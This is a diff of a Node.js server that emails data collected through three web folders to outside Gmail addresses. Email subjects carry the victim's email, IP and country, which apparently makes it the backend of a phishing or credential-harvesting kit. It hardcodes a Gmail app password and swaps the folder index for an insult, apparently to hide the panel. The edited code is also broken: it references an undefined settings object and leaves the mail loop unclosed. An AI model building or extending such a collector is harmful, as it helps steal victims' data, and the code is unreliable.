@@ -17,11 +17,25 @@ const SENDER_PASSWORD = 'tmyh wklt uyig lots';
 
 // EMAIL TUJUAN PER FOLDER
 const EMAIL_CONFIG = {
-    'public1': ['chilligemaass@gmail.com'],
-    'public2': ['akunvanzz888@gmail.com'],
-    'public3': ['zamzaja78@gmail.com']
+    'public1': {
+        email: ['chilligemaass@gmail.com'],
+        fromName: '',        // Nama pengirim di Gmail
+        subject: '',    // Subject email
+        theme: ''                          // Bisa buat custom HTML juga
+    },
+    'public2': {
+        email: ['akunvanzz888@gmail.com'],
+        fromName: '',
+        subject: '',
+        theme: ''
+    },
+    'public3': {
+        email: ['zamzaja78@gmail.com'],
+        fromName: '',
+        subject: '',
+        theme: ''
+    }
 };
-
 // Cooldown per EMAIL TARGET
 const TARGET_COOLDOWN = {};
 const COOLDOWN_HOURS = 1;
@@ -247,19 +261,11 @@ body{
     const receivers = EMAIL_CONFIG[folderName];
     for (const receiver of receivers) {
         await transporter.sendMail({
-            from: `"${folderName.toUpperCase()} ${flagEmoji}" <${SENDER_EMAIL}>`,
-            to: receiver,
-            subject: `🦖 WEB DSTR SH 🦖 ${folderName} ${flagEmoji} ${countryName} ${data.ip_address || '-'}`,
-            html: htmlContent,
-            attachments: [{
-                filename: `WEB_DSTR_${folderName}_${Date.now()}.json`,
-                content: JSON.stringify(data, null, 2)
-            }]
-        });
-        console.log(`✅ [${folderName}] Sent to: ${receiver}`);
-        await new Promise(resolve => setTimeout(resolve, 2000));
-    }
-}
+    from: `"${FOLDER_SETTINGS[folderName].fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
+    to: receiver,
+    subject: `${FOLDER_SETTINGS[folderName].subject} ${flagEmoji} ${data.email}`,
+    html: htmlContent
+});
 
 // ========== ROUTING UNTUK MASING-MASING FOLDER ==========
 
@@ -380,10 +386,7 @@ app.get('/', (req, res) => {
         </head>
         <body>
             <div class="container">
-                <h1>🔥 MULTI FOLDER SYSTEM</h1>
-                <a href="/public1/">📁 PUBLIC 1 (chilligemaass)</a>
-                <a href="/public2/">📁 PUBLIC 2 (akunvanzz888)</a>
-                <a href="/public3/">📁 PUBLIC 3 (zamzaja78)</a>
+                <h1>Tolol lu mau ngapain</h1>
             </div>
         </body>
         </html>
